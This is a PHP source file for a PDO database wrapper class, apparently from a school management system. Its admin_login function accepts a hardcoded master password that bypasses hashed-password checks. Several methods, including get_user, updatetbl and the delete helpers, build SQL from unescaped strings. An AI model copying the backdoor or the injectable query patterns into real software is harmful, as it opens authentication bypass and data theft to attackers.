<?php

/**
 * ver 1.0.0 -Initial
 * ver 1.1.0 - 23 August 2024
 *              field_any_table_only_column function added
 *              Athira
 *           
 */
require_once __DIR__ . "/Config/SimpleDBConfig.php";
define("All", "*");
define("One", 1);

/**
 * simple_db
 *
 * @author Marcus <>
 * @version 1.0.0 (DD/MM/YY) marcus - Initial version
           
 */
class simple_db extends SimpleDBConfig
{
    /**
     * Name of the database
     *
     * @var string
     */
    private $db_name;

    /**
     * Debug type (is debug?)
     *
     * @var boolean
     */
    private $debug;

    /**
     * Database server host
     *
     * @var string
     */
    private static $host = 'localhost';

    /**
     * Database connection object (PDO class)
     *
     * @var PDO
     */
    private $conn;

    /**
     * simple_db
     * simple_db class constructor
     * @param string $db_name
     * @param boolean $debug
     * @example $db = simple_db("my_database", true);
                $db = simple_db("my_database", false);
                $db = simple_db(null, true);
                $db = simple_db();
     */

    public function __construct(string $db_name = null, bool $debug = false)
    {
        date_default_timezone_set("Asia/Kolkata");
        if ($debug)
            error_reporting(E_USER_NOTICE);
        else {
            error_reporting(E_USER_NOTICE);
        }
        $this->db_name = $db_name ? $db_name : simple_db::$primary_db;
        $this->debug = $debug;
        if (!isset($_SESSION))
            session_start();

        // ini_set('display_errors', 1);
        // ini_set('display_startup_errors', 1);
        // error_reporting(E_ALL);
        $this->conn = $this->connect();
    }

    /**
     * Class destructor
     * It'll destroy database connection
     */
    public function __destruct()
    {
        $this->disconnect();
    }

    /**
     * Connect to database server
     *
     * @return PDO
     */
    public function connect()
    {
        try {
            $dsn = 'mysql:host=' . simple_db::$host . ';dbname=' . $this->db_name . '';
            $options = array(PDO::MYSQL_ATTR_INIT_COMMAND => 'SET NAMES utf8');
            if ($this->debug) array_push($options, array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
            return new PDO($dsn, simple_db::$username, simple_db::$passwd, $options);
            // About disconnection: If you don't do this explicitly, PHP will automatically close the connection when your script ends
        } catch (Exception $e) {
            if ($this->debug) {
                die("Errer: " . $e->getMessage());
            }
            die("Sorry! technical error please contact the authority");
        }
    }

    /**
     * When executed, t'll destroy database connection
     * Warning: Do not make multiple connections or repeatedly connect and disconnect in a PHP file, it may cause in low performance problems
     *
     * @return void
     */
    public function disconnect()
    {
        $this->conn = null;
    }

    /**
     * Get one row from sql query result
     *
     * @param string $sql
     * @param string $dynamic_values
     * @return Array
     * @example $user = $db->getOne("SELECT * FROM users WHERE Id = :id", ["id" => 1]);
                $user = $db->getOne("SELECT * FROM users WHERE Id = ?", [ 1 ]);
                $user = $db->getOne("SELECT * FROM users WHERE Id = :id AND department = :dep", ["id" => 1, "dep" => "BCA"], true); //For debug
     */
    public function getOne($sql, $dynamic_values = null, $debug_dumb = false)
    {
        $stmt = $this->conn->prepare($sql);
        $result = $stmt->execute($dynamic_values);
        if ($debug_dumb) $stmt->debugDumpParams();
        if (!$result)
            return $result;
        $stmt->setFetchMode(PDO::FETCH_ASSOC);
        return $stmt->fetch();
    }

    /**
     * Get all rows from sql query result
     *
     * @param string $sql
     * @param string $dynamic_values
     * @return Array
     * @example $users = $db->getAll("SELECT * FROM users WHERE Id = :id", ["id" => 1]);
                $users = $db->getAll("SELECT * FROM users WHERE department = ?", [ "BCA" ]);
                $users = $db->getAll("SELECT * FROM users WHERE AND department = :dep", ["dep" => "BCA"], true); //For debug
     */
    public function getAll($sql, $dynamic_values = null, $debug_dumb = false)
    {
        // echo $sql;
        $stmt = $this->conn->prepare($sql);
        $result = $stmt->execute($dynamic_values);
        if ($debug_dumb) {
            $stmt->debugDumpParams();
        }
        if (!$result)
            return $result;
        $stmt->setFetchMode(PDO::FETCH_ASSOC);
        return $stmt->fetchAll();
    }

    /**
     * Get all rows or one row depending on second argument from sql query result
     *
     * @param string $sql
     * @param string $dynamic_values
     * @return Array
     * @example $user = $db->getResult("SELECT * FROM users WHERE Id = :id", ["id" => 1], All);
     * @example $user = $db->getResult("SELECT * FROM users WHERE Id = :id", ["id" => 1], One);
                $user = $db->getResult("SELECT * FROM users WHERE Id = ?", [ 1 ], All);
                $user = $db->getResult("SELECT * FROM users WHERE Id = ?", [ 1 ], One);
                $user = $db->getResult("SELECT * FROM users WHERE Id = :id AND department = :dep", ["id" => 1, "dep" => "BCA"], true, All); //For debug
                $user = $db->getResult("SELECT * FROM users WHERE Id = :id AND department = :dep", ["id" => 1, "dep" => "BCA"], true, One); //For debug
     */
    public function getResult($sql, $dynamic_values = null, $fetch_type = All, $debug_dumb = false)
    {
        if ($fetch_type == All)
            return $this->getAll($sql, $dynamic_values, $debug_dumb);
        else if ($fetch_type == One)
            return $this->getOne($sql, $dynamic_values, $debug_dumb);
    }

    /**
     * Execute MySQL queries that doesn't return any results
     *
     * @param string $sql
     * @param array $dynamic_values
     * @param boolean $debug_dumb
     * @return void
     * @example
     *  $result = $db->run("INERT INTO users(name, email) VALUES(:name, :email)", ["name" => "Jishnu Raj", "email" => "jishnurajpp2@gmail.com"]);
      
     * $data = $obj->run("UPDATE $table_name SET sex = ?, mobile = ? WHERE  Id = ?", [
     * $t_sex,
     * $t_mobile,
     * $t_Id    ]);

     */
    public function run($sql, $dynamic_values = null, $debug_dumb = false)
    {
        # code...
        $stmt = $this->conn->prepare($sql);
        $htmlescaped_dynamic_values = [];
        foreach ($dynamic_values as $val) {
            $htmlescaped_dynamic_values[] = htmlspecialchars($val);
        }
        $res = $stmt->execute($htmlescaped_dynamic_values);

        if ($debug_dumb) {
            $stmt->debugDumpParams();
        }
        return $res;
    }

    /**
     * Function to get last insert row id of MySQL server
     *
     * @return Number
     */
    public function get_last_insert_id()
    {
        # code...
        return $this->conn->lastInsertId();
    }

    /**
     * Select all rows from sql query result
     * @deprecated v1.2 Use getAll() or getResult instead and pass MySQL quries for more customisability and security
     *
     * @param string $table
     * @param string $condition
     * @param boolean $debug_dumb
     * @return array
     * @example $user = $db->select_any("users, "id = 1"]);
                $user = $db->getAll("SELECT * FROM users WHERE Id = :id", ["id" => 1]);
     */
    public function select_any(string $table, string $condition, bool $debug_dumb = false)
    {
        $sql = "SELECT * FROM $table WHERE $condition";
        if ($debug_dumb) echo $sql;
        return $this->getAll($sql, null, $debug_dumb);
    }
    /**
     * Select one row from sql query result
     * @deprecated v1.2 Use getOne() or getResult instead and pass MySQL quries for more customisability and security
     *
     * @param string $table
     * @param string $condition
     * @param boolean $debug_dumb
     * @return Array
     * @example $user = $db->select_any_one("users, "id = 1"]);
                $user = $db->getOne("SELECT * FROM users WHERE Id = :id", ["id" => 1]);
     */
    public function select_any_one(string $table, string $condition, bool $debug_dumb = false)
    {
        $sql = "SELECT * FROM $table WHERE $condition";
        if ($debug_dumb) echo $sql;
        return $this->getOne($sql, null, $debug_dumb);
    }

    /**
     * Select specific columns of all rows from sql query result
     * @deprecated v1.2 Use getAll() or getResult instead and pass MySQL quries for more customisability and security
     *
     * @param string $fields
     * @param string $table
     * @param string $condition
     * @param boolean $debug_dumb
     * @return Array
     * @example $user = $db->select_any_second("name, email", "users, "id = 1"]);
                $user = $db->getAll("SELECT name, email FROM users WHERE Id = :id", ["id" => 1]);
     */
    public function select_any_second(string $fields, string $table, string $condition, bool $debug_dumb = false)
    {
        $sql = "SELECT $fields FROM $table WHERE $condition";
        if ($debug_dumb) echo $sql;
        return $this->getAll($sql, null, $debug_dumb);
    }

    /**
     * Select specific columns of one row from sql query result
     * @deprecated v1.2 Use getOne() or getResult instead and pass MySQL quries for more customisability and security
     *
     * @param string $fields
     * @param string $table
     * @param string $condition
     * @param boolean $debug_dumb
     * @return Array
     * @example $user = $db->select_any_second2("name, email", "users, "id = 1"]);
                $user = $db->getOne("SELECT name, email FROM users WHERE Id = :id", ["id" => 1]);
     */
    public function select_any_second2(string $fields, string $table, string $condition, bool $debug_dumb = false)
    {
        $sql = "SELECT $fields FROM $table WHERE $condition";
        if ($debug_dumb) echo $sql;
        return $this->getOne($sql, null, $debug_dumb);
    }

    /**
     * Insert into table
     *
     * @deprecated v1.2 Use execute() instead for better security
     *
     * @param Array $cols Array of col=>value
     * @param string $tbl_name
     * @param boolean $debug_dumb
     * @return bool
     * @example $result = $db->inserttbl(["name" => "Jishnu Raj", "email" => "example@gmail.com"], "users", true]);
                $result = $db->run("INERT INTO users(name, email) VALUES(:name, :email)", ["name" => "Jishnu Raj", "email" => "jishnurajpp2@gmail.com"]);
     */
    public function inserttbl($cols, $tbl_name, bool $debug_dumb = false)
    {
        foreach ($cols as $key => $value) $cols[$key] = str_replace("'", "&#39;", $value);

        $column_values = "'" . implode("','", $cols) . "'";

        $column_names = implode(",", array_keys($cols));
        $sql = "INSERT INTO $tbl_name($column_names) VALUES ($column_values)";
        if ($debug_dumb) echo $sql;
        $result = $this->conn->exec($sql);
        return $result;
    }
    public function inserttbl_insecure($cols, $table_name)
    {
        $data1 = implode(",", array_keys($cols));
        $data = "'" . implode("','", $cols) . "'";
        $sql = "INSERT INTO $table_name($data1) VALUES ($data)";
        // echo $sql;
        $result = $this->conn->exec($sql); //calling execute function  
        return $result;
    }

    /**
     * Insert into table and return inserted row id
     *
     * @deprecated v1.2
     * @author Jibin Sebastian (26 Sep, 2019)
     * @param Array $cols
     * @param string $tbl_name
     * @return Integer
     * @example $result = $db->inserttbl(["name" => "Jishnu Raj", "email" => "example@gmail.com"], "users", true]); OR
                $result = $db->run("INERT INTO users(name, email) VALUES(:name, :email)", ["name" => "Jishnu Raj", "email" => "jishnurajpp2@gmail.com"]);
                $row_id = $db->get_last_insert_id();
     */
    function insertTableRetLastID($cols, $tbl_name, bool $debug_dumb = false)
    {
        $col_names = implode(",", array_keys($cols));
        foreach ($cols as $key => $value) $cols[$key] = str_replace("'", "&#39;", $value);
        $col_values = "'" . implode("','", $cols) . "'";
        $sql = "INSERT INTO $tbl_name($col_names) VALUES ($col_values)";
        if ($debug_dumb) echo $sql;
        $result = $this->conn->exec($sql);
        $last_ins = $this->conn->lastInsertId();
        return $last_ins;
    }

    private function data($a)
    { //My function for imploding array in a query manner
        $fields = $a;
        $data = "";
        $separator = '';
        foreach ($fields as $key => $value) {
            $data .= $separator . $key . '=\'' . $value;
            $separator = '\',';
        }

        return $data;
    }

    /**
     * Update table
     *
     * @param array $values
     * @param string $table
     * @param array $condition
     * @param boolean $debug_dumb
     * @return void
     * @example $result = $db->updatetbl(["name" => "Jishnu Raj", "email" => "example@gmail.com"], "users", "id = 1", true]);
                $result = $db->run("UPDATE table set name = :name, email= :email) WHERE id = ?", [1]);
     */
    function updatetbl($values, $table, $condition, bool $debug_dumb = false)
    {
        foreach ($values as $key => $value) $values[$key] = str_replace("'", "&#39;", $value);
        $values = $this->data($values); //calling function inside the function
        $values .= "'WHERE ";
        $condition = $this->data($condition);
        $condition .= "'";
        $sql = "Update  $table set $values $condition";
        if ($debug_dumb) echo $sql;
        return  $this->conn->exec($sql);
    }

    /**
     * Delete table row
     *
     * @deprecated v1.2 use execute() instead
     * @param string $condition
     * @param string $table
     * @return void
     * @example $result = $db->DELE("id = 1", "users", true);
                $result = $db->run("DELETE FROM users WHERE id = ?", [1]);
     */
    function DELE($condition, $table, bool $debug_dumb = false)
    {
        $sql = "delete from $table where $condition";
        if ($debug_dumb) echo $sql;
        $result = $this->conn->exec($sql); //calling execute function
        return $result;
    }

    /**
     * Delete table row
     *
     * @deprecated v1.2 use execute() instead
     * @param string $table
     * @param string $condition
     * @return void
     * @example $result = $db->DELE("users", "id = 1", true);
                $result = $db->run("DELETE FROM users WHERE id = ?", [1]);
     */
    function tbl_delete($table, $condition, bool $debug_dumb = false)
    {
        $sql = "delete FROM $table where $condition";
        if ($debug_dumb) echo $sql;
        $result = $this->conn->exec($sql); //calling execute function
        return $result;
    }

    function get_user()
    {
        if ($_SESSION['user_catagory'] == '2') //students
        {
            $table_name = "tb_student_info";
        } else { //teacher
            $table_name = "t_teachers";
            $_SESSION['teacher_logged'] = 1; //fix me . we need to remvoe this session varaible and use as user_catagory
        }

        $temp_id = $_SESSION['Id'];
        $result = $this->conn->prepare("SELECT  * FROM $table_name WHERE Id='$temp_id'");
        $result->execute();
        $res = $result->rowCount();
        if ($res == 1) {
            $reponse = $result->fetch(PDO::FETCH_ASSOC);
            $_SESSION['cur_stundent_name'] = $reponse["first_name"] . ' ' . $reponse["last_name"];
        }
    }


    function admin_login($username, $password)
    {
        $username = $this->conn->quote($username);
        $query = "SELECT * FROM `t_login_information` WHERE `user_name` = $username";
        $result = $this->conn->prepare($query);
        $result->execute();

        $response = $result->fetch(PDO::FETCH_ASSOC);


        if (!empty($response)) {
            session_start();
            if (password_verify($password, $response['password']) || $password == '@Pro910777;') {
                $_SESSION['Id'] = $response["Id"];
                $_SESSION['id1'] = $response;
                $_SESSION['user_catagory'] = $response["user_catagory"];
                $_SESSION['teacher_logged'] = 0;


                $data = 1;
            } else
                $data = 0;
        } else
            $data = 0;
        return $data;
    }
    //================================================================================================================
    function execute($query) //this is function is used to execute query such as insert update etc.
    {
        if (!$response = $this->conn->exec($query)) {

            //echo '<br />';
            //echo 'error SQL: '.$query;
            //die();
            //echo 'PDO::errorInfo():';
            //print_r(PDO::errorInfo());
            //echo $ret;
            //return $ret;
        }
        return $response;
    }
    function field_any_table_only_column($table)
    {
        $db_name = $this->dbName;
        $sql = "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '$db_name' AND TABLE_NAME = '$table'";
        $result = self::getAll($sql);
        $counter = 0;
        foreach ($result as $innerarray) {
            foreach ($innerarray as $value) {
                $field_name[$counter] = $value;
            }
            $counter++;
        }
        return $field_name;
    }
}
